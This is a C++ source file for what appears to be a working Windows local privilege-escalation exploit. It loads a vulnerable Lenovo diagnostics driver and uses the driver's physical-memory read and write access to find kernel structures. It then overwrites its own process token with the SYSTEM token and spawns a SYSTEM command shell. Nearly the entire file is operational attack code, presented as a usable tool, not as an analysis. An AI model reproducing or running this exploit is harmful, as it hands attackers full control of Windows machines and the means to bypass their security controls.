#include "common.hpp"
#include "kernel.hpp"
#include "providers/lenovo.hpp"
#include "symbols.hpp"
#include "vdm.hpp"

#include <cstdlib>
#include <cstring>
#include <exception>

namespace
{
    uint64_t resolve_pte_base( vdm::memory& memory , kernel_symbols& symbols , uint64_t nt_base , uint32_t build )
    {
        uint64_t variable = symbols.address( L"MmPteBase" );
        if ( variable ) {
            uint64_t value = 0;
            if ( memory.read_virt<uint64_t>( variable , &value ) && is_kernel_address( value ) && ( value & 0xFFF ) == 0 ) {
                LOG( "[+] MmPteBase (PDB) = 0x%llX\n" , static_cast< unsigned long long >( value ) );
                return value;
            }
            LOG( "[-] PDB MmPteBase value was unavailable or invalid\n" );
        }

        LOG( "[*] falling back to the kernel pattern resolver\n" );
        return resolve_pte_base_by_pattern( memory , nt_base , build );
    }

    version_info resolve_process_layout( kernel_symbols& symbols , uint32_t build )
    {
        version_info version = pick_version( build );
        uint32_t process_id = 0;
        uint32_t links = 0;
        uint32_t token = 0;
        if ( symbols.field_offset( L"_EPROCESS" , L"UniqueProcessId" , &process_id ) 
            && symbols.field_offset( L"_EPROCESS" , L"ActiveProcessLinks" , &links ) 
            && symbols.field_offset( L"_EPROCESS" , L"Token" , &token ) ) // debated in my head for a min on how i should deal with this code, 
                                                                          // open to improvements on this line alone lol
        {
            version.unique_process_id = process_id;
            version.active_process_links = links;
            version.token = token;
            LOG( "[+] _EPROCESS offsets resolved from PDB\n" );
        }
        else {
            LOG( "[*] using build-table _EPROCESS offsets\n" );
        }
        return version;
    }

    int run_pdb_test( )
    {
        kernel_symbols symbols;
        constexpr uint64_t test_base = 0x140000000ULL;
        if ( !symbols.load( test_base ) )
            return 1;

        uint32_t process_id = 0;
        uint32_t links = 0;
        uint32_t token = 0;
        bool fields_resolved = symbols.field_offset( L"_EPROCESS" , L"UniqueProcessId" , &process_id ) && symbols.field_offset( L"_EPROCESS" , L"ActiveProcessLinks" , &links ) && symbols.field_offset( L"_EPROCESS" , L"Token" , &token );

        uint64_t pte_base = symbols.address( L"MmPteBase" );
        uint64_t initial_system_process = symbols.address( L"PsInitialSystemProcess" );
        LOG( "[*] PDB test addresses: MmPteBase=0x%llX PsInitialSystemProcess=0x%llX\n" , static_cast< unsigned long long >( pte_base ) , static_cast< unsigned long long >( initial_system_process ) );
        if ( !fields_resolved || !pte_base || !initial_system_process ) {
            LOG( "[-] PDB test failed\n" );
            return 1;
        }

        LOG( "[+] PDB test offsets: PID=0x%X Links=0x%X Token=0x%X\n" , process_id , links , token );
        return 0;
    }
} // namespace

int main( int argument_count , char** arguments )
{
    setvbuf( stdout , nullptr , _IONBF , 0 );

    try // SEH for the win
    {
        providers::lenovo_diagnostics driver; // init driver here, our class constructor for this vulnerable driver already does this

        vdm::read_phys_t _read_phys = [ & ] ( void* address , void* buffer , std::size_t size ) -> bool { return driver.read_phys( address , buffer , size ); };
        vdm::write_phys_t _write_phys = [ & ] ( void* address , void* buffer , std::size_t size ) -> bool { return driver.write_phys( address , buffer , size ); };

        vdm::memory memory( _read_phys , _write_phys );
        LOG( "[+] Opened %ls\n" , providers::lenovo_diagnostics::device_path( ) );

        memory.swap_ = find_swap_slot( memory );
        if ( !memory.swap_ ) {
            LOG( "[-] no swap slot found\n" );
            return 1;
        }
        LOG( "[+] swap slot at phys 0x%llX\n" , static_cast< unsigned long long >( memory.swap_ ) );

        uint64_t nt_base = ntos_base_from_system_info( );
        if ( !nt_base ) {
            LOG( "[-] refusing unsafe kernel VA scan\n" );
            return 1;
        }
        LOG( "[+] ntoskrnl base = 0x%llX\n" , static_cast< unsigned long long >( nt_base ) );
        memory.nt_base_ = nt_base;

        uint16_t mz = 0;
        if ( !memory.read_virt<uint16_t>( nt_base , &mz ) ) {
            LOG( "[-] failed to read the base address\n" );
            return 1;
        }
        LOG( "[+] ntoskrnl header = 0x%04X (expect 0x5A4D)\n" , mz );
        if ( mz != 0x5A4D ) return 1;

        uint32_t build = get_windows_build( );
        LOG( "[+] Windows build %u\n" , build );

        kernel_symbols symbols;
        symbols.load( nt_base );

        memory.pte_base_ = resolve_pte_base( memory , symbols , nt_base , build );
        if ( !memory.pte_base_ ) {
            LOG( "[-] PteBase resolve failed\n" );
            return 1;
        }

        uint64_t ps_initial_system_process = symbols.address( L"PsInitialSystemProcess" );
        if ( !ps_initial_system_process ) {
            ps_initial_system_process = resolve_kernel_export( nt_base , "PsInitialSystemProcess" );
            if ( ps_initial_system_process ) {
                LOG( "[*] PsInitialSystemProcess resolved from export table\n" );
            }
        }
        else {
            LOG( "[+] PsInitialSystemProcess resolved from PDB\n" );
        }
        if ( !ps_initial_system_process ) {
            LOG( "[-] PsInitialSystemProcess resolve failed\n" );
            return 1;
        }
        LOG( "[+] PsInitialSystemProcess VA = 0x%llX\n" , static_cast< unsigned long long >( ps_initial_system_process ) );

        uint64_t system_process = 0;
        if ( !memory.read_virt<uint64_t>( ps_initial_system_process , &system_process ) ) {
            LOG( "[-] read PsInitialSystemProcess failed\n" );
            return 1;
        }
        if ( !is_kernel_address( system_process ) ) {
            LOG( "[-] invalid System EPROCESS pointer\n" );
            return 1;
        }
        LOG( "[+] System EPROCESS = 0x%llX\n" , static_cast< unsigned long long >( system_process ) );

        version_info version = resolve_process_layout( symbols , build );
        LOG( "[+] offs: PID=0x%X Links=0x%X Token=0x%X\n" , version.unique_process_id , version.active_process_links , version.token );

        uint64_t system_token = 0;
        if ( !memory.read_virt<uint64_t>( system_process + version.token , &system_token ) ) {
            return 1;
        }
        system_token &= ~0xFULL;
        if ( !is_kernel_address( system_token ) ) {
            LOG( "[-] invalid System token pointer\n" );
            return 1;
        }
        LOG( "[+] System token = 0x%llX\n" , static_cast< unsigned long long >( system_token ) );

        DWORD current_process_id = GetCurrentProcessId( );
        uint64_t current = system_process;
        uint64_t our_process = 0;
        for ( int i = 0; i < 1000; ++i )
        {
            uint64_t process_id = 0;
            if ( !memory.read_virt<uint64_t>( current + version.unique_process_id , &process_id ) ) {
                break;
            }

            if ( i < 5 ) {
                LOG( "    [%d] EPROCESS 0x%llX PID %lu\n" , i , static_cast< unsigned long long >( current ) , static_cast< unsigned long >( process_id & 0xFFFFFFFF ) );
            }
            if ( static_cast< DWORD >( process_id ) == current_process_id ) {
                our_process = current;
                break;
            }

            uint64_t next_link = 0;
            if ( !memory.read_virt<uint64_t>( current + version.active_process_links , &next_link ) || !next_link ) {
                break;
            }
            uint64_t next = next_link - version.active_process_links;
            if ( !is_kernel_address( next ) || next == current ) break;
            current = next;
        }

        if ( !our_process ) {
            LOG( "[-] our EPROCESS not found\n" );
            return 1;
        }
        LOG( "[+] our EPROCESS = 0x%llX\n" , static_cast< unsigned long long >( our_process ) );

        uint64_t old_token = 0;
        if ( !memory.read_virt<uint64_t>( our_process + version.token , &old_token ) ) {
            LOG( "[-] failed to read current token\n" );
            return 1;
        }
        LOG( "[*] old token = 0x%llX -> new token = 0x%llX\n" , static_cast< unsigned long long >( old_token & ~0xFULL ) , static_cast< unsigned long long >( system_token ) );

        if ( !memory.write_virt<uint64_t>( our_process + version.token , &system_token ) )
        {
            LOG( "[-] failed to write sys token to our process\n" );
            return 1;
        }

        uint64_t verify = 0;
        if ( !memory.read_virt<uint64_t>( our_process + version.token , &verify ) ) {
            LOG( "[-] token verification read failed\n" );
            return 1;
        }
        LOG( "[+] verify token = 0x%llX\n" , static_cast< unsigned long long >( verify & ~0xFULL ) );
        if ( ( verify & ~0xFULL ) != system_token ) {
            LOG( "[-] token verify mismatch\n" );
            return 1;
        }

        // sanity check to see if we're system
        HANDLE disk = CreateFileW( L"\\\\.\\PHYSICALDRIVE0" , GENERIC_READ , FILE_SHARE_READ | FILE_SHARE_WRITE , nullptr , OPEN_EXISTING , 0 , nullptr );
        if ( disk != INVALID_HANDLE_VALUE ) {
            LOG( "[+] Opened \\\\.\\PHYSICALDRIVE0 -> SYSTEM\n" );
            CloseHandle( disk );
        }
        else {
            LOG( "[-] PHYSICALDRIVE0 open failed: %lu\n" , GetLastError( ) );
        }

        STARTUPINFOW si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof( si );
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;

        // create the bullshit 
        if ( CreateProcessW( L"C:\\Windows\\System32\\cmd.exe" , 0 , 0 , 0 , 0 , CREATE_NEW_CONSOLE , 0 , 0 , &si , &pi ) ) {
            printf( "[+] CMD process spawned with PID: %ld\n" , pi.dwProcessId );

            WaitForSingleObject( pi.hProcess , INFINITE );
            CloseHandle( pi.hProcess );
            CloseHandle( pi.hThread );
        }
        else {
            printf( "[-] Failed to spawn CMD: %d\n" , GetLastError( ) );
        }
    }
    catch ( const std::exception& error )
    {
        fprintf( stderr , "[-] %s\n" , error.what( ) );
        return 1;
    }
    return 0;
}
